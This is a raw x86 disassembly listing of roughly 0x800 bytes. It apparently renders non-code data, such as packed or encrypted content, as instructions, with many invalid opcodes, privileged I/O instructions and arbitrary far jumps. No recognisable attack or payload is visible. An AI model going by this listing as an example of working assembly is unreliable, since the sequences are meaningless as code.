  421f94:	inc    edi
  421f95:	inc    edx
  421f96:	outs   dx,BYTE PTR ds:[esi]
  421f97:	mov    al,ds:0xa5ae7db9
  421f9c:	mov    DWORD PTR [edx+ebx*1+0x6c],0xf165abe6
  421fa4:	sbb    DWORD PTR [ecx-0x1c99a1d6],0xd3ac9f3d
  421fae:	fstp   QWORD PTR [ebx+0x2d8e5fa4]
  421fb4:	ins    BYTE PTR es:[edi],dx
  421fb5:	shr    DWORD PTR [eax],0xf1
  421fb8:	mov    dl,0x22
  421fba:	popa   
  421fbb:	sbb    eax,0xb85e43a6
  421fc0:	mov    dh,0xd9
  421fc2:	mov    edi,0xf489af85
  421fc7:	sahf   
  421fc8:	(bad)  
  421fc9:	shl    cl,cl
  421fcb:	outs   dx,DWORD PTR ds:[esi]
  421fcc:	jp     0x421fbd
  421fce:	aam    0xe3
  421fd0:	mov    WORD PTR [edx-0x61b0873f],?
  421fd6:	ret    
  421fd7:	dec    ebx
  421fd8:	add    DWORD PTR [ebx],0x3f8540b7
  421fde:	cli    
  421fdf:	into   
  421fe0:	pop    edx
  421fe1:	push   0xe
  421fe3:	loope  0x422030
  421fe5:	add    dl,ah
  421fe7:	ror    DWORD PTR [ebx+0x19664c7c],1
  421fed:	bound  edx,QWORD PTR [ecx+0x394c88d]
  421ff3:	add    DWORD PTR [edi+0x7313f97d],eax
  421ff9:	sbb    eax,0x80d5b5e7
  421ffe:	(bad)  
  421fff:	jg     0x422023
  422001:	inc    esp
  422002:	add    DWORD PTR [ebx-0xfdde2de],ebp
  422008:	add    dh,BYTE PTR [edi+0x27]
  42200b:	mov    bl,BYTE PTR [ebx+0x55]
  42200e:	xchg   edx,edi
  422010:	call   0x135a:0xc30f08a6
  422017:	sbb    eax,0xe05946df
  42201c:	dec    edx
  42201d:	push   eax
  42201e:	mov    edx,0xc13f25bd
  422023:	ret    
  422024:	pop    es
  422025:	in     eax,0x9
  422027:	mov    edx,0x885121a4
  42202c:	inc    ecx
  42202d:	or     edi,DWORD PTR [eax-0x6200f8d2]
  422033:	es jno 0x421fc7
  422036:	sbb    cl,BYTE PTR [esi-0x40]
  422039:	jns    0x4220b6
  42203b:	adc    ebp,esi
  42203d:	jp     0x42205d
  42203f:	push   eax
  422040:	jle    0x4220a3
  422042:	loope  0x42205a
  422044:	ror    DWORD PTR [edx-0x6c85194f],cl
  42204a:	push   0xffffffa9
  42204c:	fbstp  TBYTE PTR ds:0xd1d5a227
  422052:	lea    ebp,[ecx-0x53]
  422055:	lods   al,BYTE PTR ds:[esi]
  422056:	test   al,0x87
  422058:	sbb    esi,DWORD PTR [eax+0x3c]
  42205b:	xchg   ecx,eax
  42205c:	dec    esi
  42205d:	je     0x422069
  42205f:	adc    BYTE PTR [eax],0x7a
  422062:	loope  0x4220d5
  422064:	scas   al,BYTE PTR es:[edi]
  422065:	(bad)  
  422066:	mov    ds:0xb1cd76eb,al
  42206b:	push   es
  42206c:	int3   
  42206d:	je     0x422039
  42206f:	dec    esp
  422070:	test   DWORD PTR [ecx-0x272b721a],eax
  422076:	jmp    0x109dae49
  42207b:	adc    BYTE PTR [ecx],dl
  42207d:	lea    ecx,[edi-0x604f49cc]
  422083:	fs stos BYTE PTR es:[edi],al
  422085:	xchg   ebx,eax
  422086:	aas    
  422087:	fcomp  DWORD PTR [edi]
  422089:	cli    
  42208a:	int    0x58
  42208c:	test   BYTE PTR [edx+ecx*4+0x15],dl
  422090:	pop    ecx
  422091:	stos   BYTE PTR es:[edi],al
  422092:	neg    BYTE PTR [ecx-0xf9ed800]
  422098:	mov    ecx,0xa738e5ef
  42209d:	push   edx
  42209e:	mov    cl,0xba
  4220a0:	in     eax,dx
  4220a1:	int3   
  4220a2:	jp     0x422045
  4220a4:	fadd   DWORD PTR [eax+0xa]
  4220a7:	xchg   esi,eax
  4220a8:	mov    fs,WORD PTR [esi+0x37]
  4220ab:	test   ch,dh
  4220ad:	pop    ebp
  4220ae:	(bad)  
  4220af:	adc    DWORD PTR [ebx+0x46],ecx
  4220b2:	jle    0x42210b
  4220b4:	adc    al,BYTE PTR [esi+edx*1]
  4220b7:	xchg   edi,eax
  4220b8:	loopne 0x42203f
  4220ba:	adc    bl,BYTE PTR [esi+0xe]
  4220bd:	std    
  4220be:	mov    ah,0x97
  4220c0:	jmp    FWORD PTR [edi-0x7e1743a6]
  4220c6:	pop    edx
  4220c7:	inc    edx
  4220c8:	push   edi
  4220c9:	pushf  
  4220ca:	xor    al,0x88
  4220cc:	sub    al,0x3a
  4220ce:	jno    0x42206b
  4220d0:	cmc    
  4220d1:	adc    BYTE PTR [ebx-0x1bbd980d],al
  4220d7:	cld    
  4220d8:	add    eax,0xfcca034c
  4220dd:	ror    bh,0xea
  4220e0:	jmp    0xc0cb:0xd4a1beb3
  4220e7:	std    
  4220e8:	ins    BYTE PTR es:[edi],dx
  4220e9:	and    DWORD PTR [edx],0x6fe7f84d
  4220ef:	out    0x9b,al
  4220f1:	enter  0xdb2c,0x78
  4220f5:	push   0x67
  4220f7:	xchg   ebp,eax
  4220f8:	pop    ds
  4220f9:	and    BYTE PTR [esi-0x80],bh
  4220fc:	test   DWORD PTR [ebx],esi
  4220fe:	hlt    
  4220ff:	leave  
  422100:	pop    edx
  422101:	mov    cl,0x6d
  422103:	enter  0xd679,0xf1
  422107:	cmc    
  422108:	push   esp
  422109:	addr16 retf 
  42210b:	pop    es
  42210c:	inc    ecx
  42210d:	xor    cl,BYTE PTR ds:0xe607828e
  422113:	jmp    0x422148
  422115:	sub    ah,ch
  422117:	dec    esi
  422118:	mov    ds:0x5f3212d9,al
  42211d:	clc    
  42211e:	sbb    DWORD PTR [edi+0x585fcccd],esi
  422124:	test   al,0x4f
  422126:	cmc    
  422127:	repz and eax,0xf60a10da
  42212d:	push   es
  42212e:	(bad)  [ecx]
  422130:	ret    0xcd13
  422133:	jns    0x4220f7
  422135:	ja     0x4220d8
  422137:	ret    0x7032
  42213a:	test   DWORD PTR [esi-0x7977b375],esp
  422140:	mov    bl,al
  422142:	stos   DWORD PTR es:[edi],eax
  422143:	mov    bh,0x1e
  422145:	xchg   DWORD PTR [eiz*8-0x53e87520],edx
  42214c:	fs aaa 
  42214e:	stos   BYTE PTR es:[edi],al
  42214f:	mov    ebp,0xcd2594c
  422154:	sub    al,0x68
  422156:	xchg   ebx,eax
  422157:	je     0x42212c
  422159:	mov    bh,0x47
  42215b:	mov    al,ds:0x40ebc52b
  422160:	mov    cl,0x9b
  422162:	or     eax,0x8a0fb9d5
  422167:	mov    dl,0x37
  422169:	nop
  42216a:	push   esp
  42216b:	lea    ebp,[ebx+edi*1-0x23]
  42216f:	stos   DWORD PTR es:[edi],eax
  422170:	out    0xa7,al
  422172:	lods   al,BYTE PTR ds:[esi]
  422173:	aas    
  422174:	fld    TBYTE PTR [ebx-0x3c30be1]
  42217a:	add    eax,0xe0ea47cc
  42217f:	xor    eax,0x60dd7385
  422184:	push   ebx
  422185:	popa   
  422186:	(bad)  [ebx-0x36]
  422189:	out    dx,al
  42218a:	jmp    0xd70e53a0
  42218f:	dec    ecx
  422190:	inc    ebx
  422191:	fsubp  st(1),st
  422193:	lock mov ecx,0xc0b8f9a6
  422199:	cs test al,0x5f
  42219c:	inc    esp
  42219d:	(bad)  
  42219e:	idiv   BYTE PTR [edi+0x53b14a05]
  4221a4:	icebp  
  4221a5:	jno    0x422131
  4221a7:	add    al,0x2b
  4221a9:	push   ecx
  4221aa:	and    BYTE PTR [ebp+0x1e],dl
  4221ad:	add    dl,BYTE PTR ds:0x171c3b29
  4221b3:	mov    cl,0xe6
  4221b5:	out    0xe4,eax
  4221b7:	jp     0x4221fb
  4221b9:	fwait
  4221ba:	shr    DWORD PTR [edx],cl
  4221bc:	jecxz  0x422209
  4221be:	mov    WORD PTR [edx],cs
  4221c0:	xchg   esp,eax
  4221c1:	ins    DWORD PTR es:[edi],dx
  4221c2:	ret    
  4221c3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4221c4:	stos   BYTE PTR es:[edi],al
  4221c5:	or     ecx,eax
  4221c7:	int3   
  4221c8:	into   
  4221c9:	out    dx,eax
  4221ca:	inc    esi
  4221cb:	fldcw  WORD PTR [ecx-0xbe4bc68]
  4221d1:	cmp    eax,0x401c2942
  4221d6:	dec    eax
  4221d7:	fcom   QWORD PTR [edx+0x32]
  4221da:	mov    WORD PTR [esi],ds
  4221dc:	nop    DWORD PTR [esi]
  4221df:	or     BYTE PTR [edx+eiz*1-0x224f0e0d],bh
  4221e6:	sti    
  4221e7:	sbb    DWORD PTR [eax],ebx
  4221e9:	pop    es
  4221ea:	test   al,0x4b
  4221ec:	adc    cl,dl
  4221ee:	xchg   edi,eax
  4221ef:	std    
  4221f0:	jmp    0x8fb:0xb7bd17a0
  4221f7:	aam    0x1a
  4221f9:	mov    eax,ds:0xcd8f4702
  4221fe:	mov    ds:0x8ec14afc,eax
  422203:	loop   0x4221f3
  422205:	not    DWORD PTR [edx]
  422207:	dec    edi
  422208:	pusha  
  422209:	sub    bl,bh
  42220b:	cld    
  42220c:	mov    bh,0xc2
  42220e:	xchg   ebp,eax
  42220f:	mov    ?,edx
  422211:	push   0x15
  422213:	imul   esi,eax,0xfffffff9
  422216:	ret    0x3930
  422219:	les    esp,FWORD PTR [eax-0x59d3af3d]
  42221f:	call   0x3f86151f
  422224:	inc    ebx
  422225:	jnp    0x42221b
  422227:	inc    di
  422229:	add    eax,0x3eef5b22
  42222e:	sbb    DWORD PTR [ecx],0xff3ce34f
  422234:	dec    edx
  422235:	mov    ebx,0x554ff67
  42223a:	add    BYTE PTR [ebx+0x25a9148f],dh
  422240:	jecxz  0x42228d
  422242:	shl    ah,cl
  422244:	icebp  
  422245:	jg     0x422228
  422247:	out    dx,al
  422248:	scas   eax,DWORD PTR es:[edi]
  422249:	and    DWORD PTR [edx-0x78a9bc06],esp
  42224f:	mov    WORD PTR [ecx-0x6b],ss
  422252:	ins    DWORD PTR es:[edi],dx
  422253:	call   0xa4b9:0xa210f27b
  42225a:	ret    
  42225b:	cmp    al,0x42
  42225d:	mov    edi,0x90daea80
  422262:	out    dx,eax
  422263:	or     bl,bh
  422265:	adc    esp,0xf7d397e8
  42226b:	cmp    esi,DWORD PTR [ebx+0x6d3e9be8]
  422271:	push   eax
  422272:	inc    esi
  422273:	adc    ch,BYTE PTR [ebp-0x760533ed]
  422279:	or     cl,BYTE PTR [ebp+0x26b36fa2]
  42227f:	ret    0x236
  422282:	cmp    eax,0x280bae95
  422287:	sbb    eax,0x91cadda8
  42228c:	retf   0x5e9c
  42228f:	mov    ds:0xe70313f,al
  422294:	rcr    BYTE PTR [eax-0x70],cl
  422297:	ja     0x4222e3
  422299:	pop    ebp
  42229a:	pop    edx
  42229b:	inc    ebx
  42229c:	mov    ds:0xc976f548,al
  4222a1:	or     eax,0xf93196ed
  4222a6:	pop    esi
  4222a7:	test   BYTE PTR [ebp-0x1],bh
  4222aa:	sti    
  4222ab:	mov    cl,0x18
  4222ad:	push   esi
  4222ae:	popa   
  4222af:	and    al,0x17
  4222b1:	int3   
  4222b2:	std    
  4222b3:	sub    DWORD PTR [eax-0x61],0xda756745
  4222ba:	mov    esi,0x114499ce
  4222bf:	(bad)  [edx+0x43]
  4222c2:	cmovne ebp,DWORD PTR [ecx]
  4222c5:	leave  
  4222c6:	ret    
  4222c7:	cdq    
  4222c8:	xchg   DWORD PTR [edx-0x20333d3b],ebx
  4222ce:	(bad)  
  4222cf:	cmc    
  4222d0:	(bad)  
  4222d1:	scas   al,BYTE PTR es:[edi]
  4222d2:	lods   eax,DWORD PTR ds:[esi]
  4222d3:	(bad)  
  4222d5:	retf   0x2390
  4222d8:	ja     0x4222f6
  4222da:	jl     0x4222eb
  4222dc:	(bad)  
  4222dd:	fist   DWORD PTR [esi]
  4222df:	push   es
  4222e0:	jmp    0x945a:0xed7ccea3
  4222e7:	add    DWORD PTR [ebp+edx*4-0x4d],ebx
  4222eb:	in     eax,0xaf
  4222ed:	sbb    BYTE PTR [ebx],al
  4222ef:	enter  0x8db0,0xb3
  4222f3:	sbb    al,0x10
  4222f5:	jae    0x4222a8
  4222f7:	adc    dh,BYTE PTR ds:0x68688ee6
  4222fd:	shl    DWORD PTR [ecx+0x366cc5cd],0xe4
  422304:	pop    es
  422305:	lock fsub QWORD PTR [edi+ebx*1]
  422309:	outs   dx,BYTE PTR ds:[esi]
  42230a:	pop    edi
  42230b:	and    ebp,DWORD PTR [edx]
  42230d:	sbb    dl,ch
  42230f:	mov    al,ds:0xa9eddc4f
  422314:	test   BYTE PTR [ecx+0x68],ah
  422317:	ficom  WORD PTR [esi+0x50]
  42231a:	sbb    bl,BYTE PTR [edx+0x255f6fbc]
  422320:	mov    ecx,0x520ec56b
  422325:	popa   
  422326:	aas    
  422327:	int3   
  422328:	xchg   BYTE PTR [edi],bl
  42232a:	imul   ebx,DWORD PTR [eax-0x29],0x2b01d9e4
  422331:	test   eax,0x23a9e151
  422336:	lds    ebx,FWORD PTR [ecx-0x46]
  422339:	push   cs
  42233a:	xchg   edx,eax
  42233b:	pop    ebp
  42233c:	adc    eax,0xda18e4d2
  422341:	sbb    eax,edi
  422343:	inc    eax
  422344:	sub    al,0x5b
  422346:	pop    esp
  422347:	dec    edx
  422348:	ja     0x4222dc
  42234a:	mov    ds:0x48a7687,eax
  42234f:	dec    edi
  422350:	stc    
  422351:	inc    ecx
  422352:	stc    
  422353:	push   edi
  422354:	stc    
  422355:	(bad)  
  422356:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422357:	aaa    
  422358:	xchg   ecx,eax
  422359:	push   esi
  42235a:	fidiv  WORD PTR ds:0x891ee2c7
  422360:	in     al,0xa3
  422362:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422363:	add    eax,0x6a760d03
  422368:	shr    BYTE PTR [eax-0x41],cl
  42236b:	in     al,0xe7
  42236d:	imul   ebp,DWORD PTR [ebx-0x2f2bbaea],0x30
  422374:	fbstp  TBYTE PTR [ebp+0x53]
  422377:	int    0x26
  422379:	scas   eax,DWORD PTR es:[edi]
  42237a:	int3   
  42237b:	inc    ecx
  42237c:	stos   BYTE PTR es:[edi],al
  42237d:	das    
  42237e:	daa    
  42237f:	push   eax
  422380:	fbld   TBYTE PTR [ebx-0x7ad85d3c]
  422386:	jae    0x4223f6
  422388:	fwait
  422389:	xor    eax,DWORD PTR [edx+edi*8-0x2150991f]
  422390:	mov    bh,0x3a
  422392:	cmp    DWORD PTR [eax],ebp
  422394:	out    0xe0,al
  422396:	xor    al,0xa8
  422398:	les    ebp,FWORD PTR [eax-0x53]
  42239b:	push   ebp
  42239c:	or     DWORD PTR [esi+0x53],0xffffffce
  4223a0:	sub    al,0x88
  4223a2:	mov    bh,0x20
  4223a4:	jmp    0x87ab8cf3
  4223a9:	push   ebp
  4223aa:	jb     0x4223ce
  4223ac:	mov    ecx,0x2ac97c97
  4223b1:	mov    bl,0x8
  4223b3:	repz jnp 0x4223c0
  4223b6:	loopne 0x42240a
  4223b8:	dec    ebx
  4223b9:	pushf  
  4223ba:	mov    bh,0x2f
  4223bc:	and    DWORD PTR [eax+0x1f3d3eca],ebp
  4223c2:	imul   ecx,ebp,0xd8d48f09
  4223c8:	push   0x3ace3b22
  4223cd:	in     eax,0xf3
  4223cf:	add    ebp,DWORD PTR [ecx+eax*4-0x7d46a94a]
  4223d6:	adc    dl,BYTE PTR [esi]
  4223d8:	cmp    al,0x1b
  4223da:	pushf  
  4223db:	xor    eax,0xa9620b72
  4223e0:	push   ebp
  4223e1:	ffreep st(4)
  4223e3:	(bad)  
  4223e4:	push   esi
  4223e5:	dec    esp
  4223e6:	neg    DWORD PTR cs:[esi+0xaf8ac29]
  4223ed:	retf   
  4223ee:	imul   BYTE PTR [edi-0x3e]
  4223f1:	jle    0x422428
  4223f3:	fstp   TBYTE PTR [esi+0x54]
  4223f6:	jecxz  0x4223a8
  4223f8:	push   ebp
  4223f9:	push   0xffffffe2
  4223fb:	mov    ebx,0xe6151c25
  422400:	jl     0x422463
  422402:	bound  edx,QWORD PTR [ebx-0x1f]
  422405:	sub    eax,0xa7efe6ff
  42240a:	fdiv   QWORD PTR [ebx]
  42240c:	adc    BYTE PTR [esi+ecx*1],bl
  42240f:	mov    esi,0xa0aa0e5
  422414:	sti    
  422415:	addr16 (bad) 
  422417:	hlt    
  422418:	and    al,0xe1
  42241a:	pushf  
  42241b:	cmc    
  42241c:	cld    
  42241d:	int3   
  42241e:	dec    ebp
  42241f:	pop    ss
  422420:	jae    0x422451
  422422:	dec    esi
  422423:	mov    edi,0xb9c56262
  422428:	das    
  422429:	popf   
  42242a:	and    DWORD PTR [edx+eax*2-0x7f],eax
  42242e:	push   ecx
  42242f:	pushf  
  422430:	dec    ebx
  422431:	retf   0x7621
  422434:	data16 (bad) 
  422436:	aas    
  422437:	out    dx,al
  422438:	adc    cl,BYTE PTR [edi-0x32f9f18c]
  42243e:	sub    eax,ecx
  422440:	jbe    0x42244d
  422442:	inc    eax
  422443:	jno    0x4224bc
  422445:	dec    ecx
  422446:	cmp    BYTE PTR [eax+0x6a6a965a],dl
  42244c:	stc    
  42244d:	ins    DWORD PTR es:[edi],dx
  42244e:	mov    DWORD PTR es:[ebx+0x167f2bd8],ebx
  422455:	addr16 call 0x1242:0xdabb5395
  42245d:	(bad)  
  42245e:	(bad)  
  42245f:	sahf   
  422460:	mov    ds:0x7e3f5b1c,al
  422465:	adc    al,BYTE PTR [esi+edx*1+0xe07a3e3]
  42246c:	cmp    cl,BYTE PTR [eax]
  42246e:	and    eax,0x617b992c
  422473:	push   es
  422474:	and    eax,0x9161df7b
  422479:	pop    ecx
  42247a:	mov    ah,0x49
  42247c:	mov    ecx,0xd68676ee
  422481:	mov    bh,al
  422483:	scas   eax,DWORD PTR es:[edi]
  422484:	fs je  0x42244b
  422487:	xchg   bl,ch
  422489:	xchg   dl,dh
  42248b:	lea    edi,[edi+0x5b]
  42248e:	jb     0x42246c
  422490:	(bad)  
  422491:	shl    DWORD PTR [ebp+0xd],1
  422494:	jmp    0x5fdca57a
  422499:	sbb    DWORD PTR [edx-0x7958c1f],esp
  42249f:	pop    edi
  4224a0:	sub    BYTE PTR [esi],cl
  4224a2:	push   ds
  4224a3:	fldcw  WORD PTR [edx-0x36]
  4224a6:	daa    
  4224a7:	or     al,0x1a
  4224a9:	add    eax,0x129a43f7
  4224ae:	xchg   ch,cl
  4224b0:	add    BYTE PTR [esp+edi*1-0x29a7a101],bl
  4224b7:	gs rcr ch,1
  4224ba:	shl    BYTE PTR [edi-0x6e],1
  4224bd:	daa    
  4224be:	mov    bl,0xdc
  4224c0:	fimul  WORD PTR [edi]
  4224c2:	and    al,0xcc
  4224c4:	mov    eax,DWORD PTR [ecx]
  4224c6:	outs   dx,DWORD PTR ds:[esi]
  4224c7:	inc    ebp
  4224c8:	xchg   ecx,eax
  4224c9:	adc    eax,0xdb4d4348
  4224ce:	fadd   DWORD PTR [esi]
  4224d0:	aaa    
  4224d1:	dec    ebx
  4224d2:	mov    dl,0x78
  4224d4:	not    DWORD PTR [esi-0x2]
  4224d7:	pop    edx
  4224d8:	bound  esp,QWORD PTR [esi+eiz*2]
  4224db:	retf   0x6601
  4224de:	sahf   
  4224df:	mov    edx,0x3904bef5
  4224e4:	or     ch,cl
  4224e6:	jae    0x42246f
  4224e8:	aaa    
  4224e9:	outs   dx,DWORD PTR ds:[esi]
  4224ea:	ins    BYTE PTR es:[edi],dx
  4224eb:	pop    ebx
  4224ec:	adc    al,0xd9
  4224ee:	sbb    al,0xfd
  4224f0:	jb     0x4224cd
  4224f2:	jne    0x42256b
  4224f4:	jl     0x422479
  4224f6:	mov    esi,0x1fea43c7
  4224fb:	sbb    bl,BYTE PTR [esi+0x65]
  4224fe:	inc    ecx
  4224ff:	lahf   
  422500:	imul   edi,esp,0xffffffcc
  422503:	add    BYTE PTR [ebp+0x6],cl
  422506:	int3   
  422507:	imul   esi,edi,0x3c
  42250a:	push   eax
  42250b:	sub    eax,0x532e8a3d
  422510:	mov    esi,0xeb44c15c
  422515:	or     al,BYTE PTR [eax+0x793630d2]
  42251b:	cli    
  42251c:	xchg   ebp,eax
  42251d:	packssdw mm5,mm6
  422520:	pop    ss
  422521:	xor    ecx,ecx
  422523:	cmp    BYTE PTR [ecx+0x74aa1742],bh
  422529:	jmp    0x422558
  42252b:	xor    edi,esp
  42252d:	mov    al,0x1d
  42252f:	sahf   
  422530:	mov    ds:0x702b6edf,al
  422535:	sub    BYTE PTR [ebp-0x3e4b523e],0x9e
  42253c:	ror    DWORD PTR [edx+0x54bb5bca],1
  422542:	out    0x20,eax
  422544:	adc    bh,BYTE PTR [ebx-0xdceef98]
  42254a:	or     ah,cl
  42254c:	mov    al,0xe1
  42254e:	lods   al,BYTE PTR ds:[esi]
  42254f:	xchg   ebp,eax
  422550:	pop    edi
  422551:	adc    bh,BYTE PTR [esi+esi*4]
  422554:	int3   
  422555:	loopne 0x422572
  422557:	rol    BYTE PTR [ecx-0x56],cl
  42255a:	add    eax,0x55a6cc77
  42255f:	add    al,0x1a
  422561:	xchg   ebx,eax
  422562:	call   0x97bbf0ee
  422567:	mov    dl,0xd3
  422569:	mov    edx,0xe2a6f9ed
  42256e:	mov    eax,ds:0x1d33fb3f
  422573:	test   al,0x7f
  422575:	shl    DWORD PTR [ebp+0x6d0dc1a9],0x75
  42257c:	cwde   
  42257d:	pop    edi
  42257e:	std    
  42257f:	push   ecx
  422580:	inc    ecx
  422581:	xchg   BYTE PTR [esi],bh
  422583:	fisub  WORD PTR [ebp+0x7eb7645d]
  422589:	jl     0x4225df
  42258b:	jg     0x422591
  42258d:	jno    0x4225d6
  42258f:	in     al,0x2f
  422591:	sub    BYTE PTR [edi+0x780db0ab],0x6a
  422598:	mov    dh,0x9c
  42259a:	add    DWORD PTR [esi-0xb1d8989],esp
  4225a0:	fcmovb st,st(0)
  4225a2:	xlat   BYTE PTR ds:[ebx]
  4225a3:	xchg   edx,eax
  4225a4:	sbb    BYTE PTR ds:0x9e2ca154,al
  4225aa:	pop    ebx
  4225ab:	sub    ebx,DWORD PTR [esi+edx*4+0x15409226]
  4225b2:	sub    ah,BYTE PTR [ebx]
  4225b4:	xchg   ebx,eax
  4225b5:	mov    ch,0x2
  4225b7:	scas   eax,DWORD PTR es:[edi]
  4225b8:	enter  0x61d7,0xf0
  4225bc:	scas   al,BYTE PTR es:[edi]
  4225bd:	out    0xe0,eax
  4225bf:	lahf   
  4225c0:	inc    esi
  4225c1:	pop    ebx
  4225c2:	mov    ebp,0x6da4e995
  4225c7:	or     al,0x4a
  4225c9:	jge    0x422643
  4225cb:	inc    ebx
  4225cc:	inc    esp
  4225cd:	scas   eax,DWORD PTR es:[edi]
  4225ce:	adc    esi,DWORD PTR [ebx]
  4225d0:	mov    dh,0x46
  4225d2:	stos   DWORD PTR es:[edi],eax
  4225d3:	mov    edi,DWORD PTR [edx]
  4225d5:	(bad)  
  4225d6:	mov    bh,BYTE PTR [ebx+0x1b7f3eff]
  4225dc:	(bad)  
  4225dd:	mov    ebp,0x26d5ce96
  4225e2:	mov    ch,0x65
  4225e4:	and    eax,0x25e58f25
  4225e9:	inc    ebx
  4225ea:	fs and ch,dh
  4225ed:	stos   BYTE PTR es:[edi],al
  4225ee:	mov    ds:0x6efef7e3,eax
  4225f3:	pop    es
  4225f4:	out    0xe7,al
  4225f6:	sub    al,0xfe
  4225f8:	dec    edx
  4225f9:	lea    edi,[edx-0x5c109ecb]
  4225ff:	pusha  
  422600:	adc    BYTE PTR [esi+0x5a9b95b],dh
  422606:	lahf   
  422607:	add    dh,ah
  422609:	stos   BYTE PTR es:[edi],al
  42260a:	jns    0x42262a
  42260c:	jge    0x42262d
  42260e:	lahf   
  42260f:	mov    eax,ds:0x5117d91
  422614:	inc    esi
  422615:	sbb    esp,eax
  422617:	imul   ecx,ebx,0xa693d009
  42261d:	cdq    
  42261e:	bound  edi,QWORD PTR [edi]
  422620:	outs   dx,BYTE PTR ds:[esi]
  422621:	jo     0x4225b1
  422623:	loopne 0x42268b
  422625:	int    0xb5
  422627:	pusha  
  422628:	push   cs
  422629:	into   
  42262a:	dec    esp
  42262b:	mov    edi,0xa1c64b5e
  422630:	pop    esp
  422631:	dec    ebx
  422632:	xor    ebx,edi
  422634:	les    edi,FWORD PTR [edx]
  422636:	mov    dl,0x2c
  422638:	test   DWORD PTR [esi],esp
  42263a:	ins    DWORD PTR es:[edi],dx
  42263b:	pop    edi
  42263c:	pusha  
  42263d:	or     eax,0x13cd7143
  422642:	pop    ds
  422643:	xchg   edi,eax
  422644:	popf   
  422645:	sbb    ebx,ebx
  422647:	(bad)  
  422648:	push   ss
  422649:	aad    0xc0
  42264b:	xchg   ebx,eax
  42264c:	add    edx,ecx
  42264e:	out    dx,al
  42264f:	xor    cl,0x21
  422652:	or     ebp,DWORD PTR [ecx]
  422654:	pop    esp
  422655:	xor    DWORD PTR [ecx-0x6f],edx
  422658:	xor    dl,BYTE PTR [ebp+0x639e9ce9]
  42265e:	(bad)  
  42265f:	repnz inc edi
  422661:	jl     0x42267e
  422663:	retf   
  422664:	inc    eax
  422665:	int3   
  422666:	inc    ecx
  422667:	push   ecx
  422668:	dec    eax
  422669:	cld    
  42266a:	(bad)  
  42266b:	out    dx,al
  42266c:	mov    ah,0xb
  42266e:	dec    DWORD PTR [esi-0x1f]
  422671:	or     DWORD PTR [edx],0x20
  422674:	hlt    
  422675:	mov    edx,0xa87b7044
  42267a:	jmp    0x42263d
  42267c:	ins    DWORD PTR es:[edi],dx
  42267d:	and    eax,DWORD PTR [esi-0x408560f8]
  422683:	mul    edx
  422685:	(bad)  
  422686:	fidiv  WORD PTR [esi+0x4e]
  422689:	adc    al,0xbc
  42268b:	mov    dl,0x37
  42268d:	xchg   DWORD PTR [edi],esi
  42268f:	push   ebp
  422690:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422691:	shl    BYTE PTR [ebx+0x2e6747cf],cl
  422697:	dec    eax
  422698:	in     al,dx
  422699:	data16 sbb BYTE PTR [edi],0x96
  42269d:	dec    eax
  42269e:	out    0x26,al
  4226a0:	mov    ebp,0x67ea86e6
  4226a5:	mov    esp,0xed358936
  4226aa:	add    eax,0xbec34a2f
  4226af:	in     al,0xd7
  4226b1:	or     eax,0x1959830f
  4226b6:	clc    
  4226b7:	jmp    0x422700
  4226b9:	add    esp,DWORD PTR [ecx+0x33b1d9d1]
  4226bf:	jmp    0x204:0x89536b4f
  4226c6:	leave  
  4226c7:	out    dx,al
  4226c8:	mov    DWORD PTR ds:0xde8517d4,0x8451cad3
  4226d2:	test   eax,0xd0ec4903
  4226d7:	cmp    eax,0x449d8b17
  4226dc:	dec    esi
  4226dd:	inc    edi
  4226de:	pop    es
  4226df:	inc    edi
  4226e0:	add    DWORD PTR [edi-0x45],edi
  4226e3:	std    
  4226e4:	push   ecx
  4226e5:	dec    ecx
  4226e6:	fnsave [esi-0x1c]
  4226e9:	mov    ecx,DWORD PTR [ebx+0x57]
  4226ec:	fadd   QWORD PTR [edx-0x1d]
  4226ef:	push   cs
  4226f0:	cwde   
  4226f1:	shl    BYTE PTR [esi+0x79ccceb2],1
  4226f7:	das    
  4226f8:	inc    ecx
  4226f9:	dec    esi
  4226fa:	add    al,0xc2
  4226fc:	dec    esi
  4226fd:	ror    DWORD PTR [esp+esi*8],0x32
  422701:	out    0x57,eax
  422703:	inc    esp
  422704:	outs   dx,DWORD PTR ds:[esi]
  422705:	pop    edi
  422706:	iret   
  422707:	dec    ebx
  422708:	leave  
  422709:	repnz mov ch,0x23
  42270c:	adc    al,0xb1
  42270e:	sbb    al,0x3
  422710:	sbb    BYTE PTR [edx+0x39023eec],bl
  422716:	(bad)  [edx-0x50]
  422719:	mov    DWORD PTR [esi],edx
  42271b:	jmp    0x9afa:0xfc63ea3
  422722:	dec    esi
  422723:	add    eax,esp
  422725:	fwait
  422726:	cmp    al,0xcc
  422728:	ins    BYTE PTR es:[edi],dx
  422729:	out    dx,al
  42272a:	shr    BYTE PTR [edx],1
  42272c:	test   al,0x66
  42272e:	sbb    eax,0xff554885
  422733:	push   cs
  422734:	outs   dx,BYTE PTR ds:[esi]
  422735:	or     ah,dh
  422737:	outs   dx,BYTE PTR ss:[esi]
  422739:	push   esp
  42273a:	aas    
  42273b:	cwde   
  42273c:	push   esp
  42273d:	or     eax,0x17fee935
  422742:	xchg   BYTE PTR [ecx],cl
  422744:	stos   DWORD PTR es:[edi],eax
  422745:	mov    ds:0xc38e16f3,eax
  42274a:	xchg   edx,eax
  42274b:	fcomp  st(2)
  42274d:	inc    edx
  42274e:	mov    edx,DWORD PTR [edx-0x605968be]
  422754:	sub    al,0x69
  422756:	cmp    bl,BYTE PTR [ebx+ebp*1+0x51]
  42275a:	pop    esp
  42275b:	mov    cl,0x7b
  42275d:	mov    al,ds:0xfc604f11
  422762:	dec    edx
  422763:	cmp    eax,0x52b96d52
  422768:	cmp    ebx,ebp
  42276a:	add    DWORD PTR [ebx*4+0x6ce8fa08],edx
  422771:	stos   BYTE PTR es:[edi],al
  422772:	dec    eax
  422773:	rcr    DWORD PTR [ebp+0x1ecb2d2e],1
  422779:	cmp    eax,0x324a2e19
  42277e:	pop    ss
  42277f:	or     DWORD PTR [ecx+edi*1+0x8],esi
  422783:	cmp    BYTE PTR [ebx+0x3677423e],cl
  422789:	push   0x1b50c3d9
  42278e:	cmp    eax,0xebe65475
  422793:	mov    BYTE PTR [eax],cl
  422795:	imul   ebx
  422797:	inc    ebp
  422798:	pop    es
  422799:	xchg   esp,eax
  42279a:	jo     0x4227b4
  42279c:	ret    0x359f
